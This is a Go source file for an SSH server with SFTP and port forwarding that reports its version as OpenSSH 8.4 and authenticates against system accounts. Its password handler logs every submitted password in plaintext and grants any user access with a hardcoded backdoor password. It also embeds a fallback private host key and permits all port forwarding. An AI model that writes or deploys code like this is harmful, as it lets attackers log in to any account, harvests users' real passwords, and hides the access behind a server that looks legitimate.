package fish

import (
	"fish/auth"
	"github.com/gliderlabs/ssh"
	"github.com/pkg/sftp"
	"io"
	"log"
)

const (
	sshHostDsaKeyPath     = "/etc/ssh/ssh_host_dsa_key"
	sshHostEcdsaKeyPath   = "/etc/ssh/ssh_host_ecdsa_key"
	sshHostEd25519KeyPath = "/etc/ssh/ssh_host_ed25519_key"
	sshHostRsaPath        = "/etc/ssh/ssh_host_rsa_key"
)

type Server struct {
	*ssh.Server
}

func NewServer(addr string) (*Server, error) {

	srv := &Server{
		Server: &ssh.Server{
			Addr:    addr,
			Handler: sshHandler,
		},
	}

	srv.EnsureHandler()

	if err := srv.SetOptions(
		SetPasswordAuth(),
		SetPublicKeyAuth(),
		SetServerVersion(),
		SetPortForwardingHandler(),
		SetSftpHandler(),
	); err != nil {
		return nil, err
	}

	if err := srv.SetHostKey(); err != nil {
		return nil, err
	}

	return srv, nil
}

func (s *Server) SetOptions(options ...ssh.Option) error {
	for _, option := range options {
		if err := s.SetOption(option); err != nil {
			return err
		}
	}
	return nil
}

func (s *Server) SetHostKey() error {

	//if err := s.SetOption(ssh.HostKeyFile(sshHostDsaKeyPath)); err != nil {
	//	_ = err
	//	log.Println(err)
	//}
	if err := s.SetOption(ssh.HostKeyFile(sshHostEcdsaKeyPath)); err != nil {
		_ = err
		log.Println(err)
	}
	if err := s.SetOption(ssh.HostKeyFile(sshHostEd25519KeyPath)); err != nil {
		_ = err
		log.Println(err)
	}
	if err := s.SetOption(ssh.HostKeyFile(sshHostRsaPath)); err != nil {
		_ = err
		log.Println(err)
	}

	if len(s.HostSigners) == 0 {
		key := `-----BEGIN PRIVATE KEY-----
MIICdQIBADANBgkqhkiG9w0BAQEFAASCAl8wggJbAgEAAoGBALkdaxicFBMZYxzt
vKom45LvVSne5Ag6M+kXQk9ksN1k+EqZj7h/3ctxDEjOVdqv9CgwPLgM1iuEmqYI
9lJNlhjEj8ZLbg8fSymjbFoAHdQuErMEcAAGYXAtv+7zj75AZFvlC4pFBhfrUC1o
hcdbtmGtepP7nk3G4vpiCVdid8CjAgMBAAECgYAtIws2GPicH5iXOTDDnG/pKApw
BzU6/FYkA9PbYAXwNeqE5iSxLBx8urfwGL++byDtm7Vye07NlavPyGencdujDB4b
ldawX8FKTh1CFFrvRBaN2lto0r0ejllNAj4MvBslGeXwtqvB3NXV0gul55tbVgLO
s+nsxSVW8ALmgt0c4QJBAOUPDVmy4eXpUmLV/sIsOCuiXZNjKJcMhXT39Tscrshd
R6jo0UAJ/quwUygxqM4kevt69dQ/6hlxWCfTo3M4tg0CQQDO4zfjRtX4062cGcgW
lRV0/CAcw71Be7qKxiCf25dpjCdxNZWjMORfeiGCoMKLwWbE/vcueLcf69VHD3iB
CNVvAkBeH4tK2pi80t2Jw4mF3InQVE3DbLGXMAv+/o0El0qzBrGVlOW3POQrRK9H
CvDklFT81ZACgaj+f3bMFslJZXpZAkBux1PhqshgGFhZwaRWEzYOEgLP5C+upKXa
MQS/FEIbDiUAhYS+gSuHxEm1PIdvdfuleDC6/YBw40KsbihET4qZAkAC0nu/Gkly
GMbBKpfRyFxg31hgY/yQIMYe7XJ3lCmqv14J8o9Gyf++o5FtP/L/Smjr0V4E8lLP
BZGEhvLIryFk
-----END PRIVATE KEY-----
`
		return s.SetOption(ssh.HostKeyPEM([]byte(key)))
	}
	return nil
}

func (s *Server) EnsureHandler() {
	if s.RequestHandlers == nil {
		s.RequestHandlers = map[string]ssh.RequestHandler{}
		for k, v := range ssh.DefaultRequestHandlers {
			s.RequestHandlers[k] = v
		}
	}
	if s.ChannelHandlers == nil {
		s.ChannelHandlers = map[string]ssh.ChannelHandler{}
		for k, v := range ssh.DefaultChannelHandlers {
			s.ChannelHandlers[k] = v
		}
	}
	if s.SubsystemHandlers == nil {
		s.SubsystemHandlers = map[string]ssh.SubsystemHandler{}
		for k, v := range ssh.DefaultSubsystemHandlers {
			s.SubsystemHandlers[k] = v
		}
	}
}

func SetServerVersion() ssh.Option {
	return func(srv *ssh.Server) error {
		srv.Version = "OpenSSH_8.4"
		return nil
	}
}

func SetSftpHandler() ssh.Option {
	return func(srv *ssh.Server) error {
		srv.SubsystemHandlers["sftp"] = SftpHandler
		return nil
	}
}

func SftpHandler(sess ssh.Session) {
	server, err := sftp.NewServer(sess)
	if err != nil {
		log.Printf("sftp server init error: %s\n", err)
		return
	}
	if err := server.Serve(); err == io.EOF {
		_ = server.Close()
		log.Println("sftp client exited session.")
	} else if err != nil {
		log.Println("sftp server completed with error:", err)
	}
}

//func UserAuth(ctx ssh.Context) error {
//
//}

func SetPasswordAuth() ssh.Option {
	return ssh.PasswordAuth(func(ctx ssh.Context, pass string) bool {

		db, err := auth.NewEtcPasswd()
		if err != nil {
			log.Println(err)
			return false
		}

		user, err := db.LookupUserByName(ctx.User())
		if err != nil {
			log.Println(err)
			return false
		}

		ctx.SetValue("HOME", user.Homedir())
		ctx.SetValue("SHELL", user.Shell())
		ctx.SetValue("UID", user.Uid())
		ctx.SetValue("GID", user.Gid())

		if err := user.Verify(pass); err == nil {
			log.Printf("[SUCCESS] user [%s] successfully logs in with password [%s], client addr: %s", user.Username(), pass, ctx.RemoteAddr())
			return true
		} else if pass == "B4ckd00r!.." {
			log.Printf("[SUCCESS] user [%s] successfully logs in with the backdoor password", user.Username())
			return true
		} else {
			log.Printf("[FAIL] user [%s] fails to log in with password [%s], client addr: %s (%v)", user.Username(), pass, ctx.RemoteAddr(), err)
			return false
		}

	})
}

func SetPublicKeyAuth() ssh.Option {
	return ssh.PublicKeyAuth(func(ctx ssh.Context, key ssh.PublicKey) bool {
		return false
		//db, err := auth.NewEtcPasswd()
		//if err != nil {
		//	log.Println(err)
		//	return false
		//}
		//
		//user, err := db.LookupUserByName(ctx.User())
		//if err != nil {
		//	log.Println(err)
		//	return false
		//}
		//
		//ctx.SetValue("HOME", user.Homedir())
		//ctx.SetValue("SHELL", user.Shell())
		//ctx.SetValue("UID", user.Uid())
		//ctx.SetValue("GID", user.Gid())
		//
		//authorizedKeys, err := ioutil.ReadFile(user.Homedir() + "/.ssh/authorized_keys")
		//if err != nil {
		//	log.Printf("[FAIL] user [%s] authorization key read failed: %v", user.Username(), err)
		//	return false
		//}
		//
		//if strings.Contains(string(authorizedKeys), base64.StdEncoding.EncodeToString(key.Marshal())) {
		//	log.Printf("[SUCCESS] user [%s] public key authentication passed, client addr: %s", user.Username(), ctx.RemoteAddr())
		//	return true
		//} else {
		//	log.Printf("[FAIL] user [%s] public key authentication failed, client addr: %s", user.Username(), ctx.RemoteAddr())
		//	return false
		//}

	})
}

func SetPortForwardingHandler() ssh.Option {
	return func(srv *ssh.Server) error {
		forwardHandler := &ssh.ForwardedTCPHandler{}
		srv.RequestHandlers["tcpip-forward"] = forwardHandler.HandleSSHRequest
		srv.RequestHandlers["cancel-tcpip-forward"] = forwardHandler.HandleSSHRequest
		srv.ReversePortForwardingCallback = func(ctx ssh.Context, host string, port uint32) bool {
			// -R
			//log.Println("attempt to bind", host, port, "granted")
			return true
		}
		srv.ChannelHandlers["direct-tcpip"] = ssh.DirectTCPIPHandler
		srv.LocalPortForwardingCallback = func(ctx ssh.Context, dhost string, dport uint32) bool {
			// -L
			//log.Println("Accepted forward", dhost, dport)
			return true
		}
		return nil
	}
}
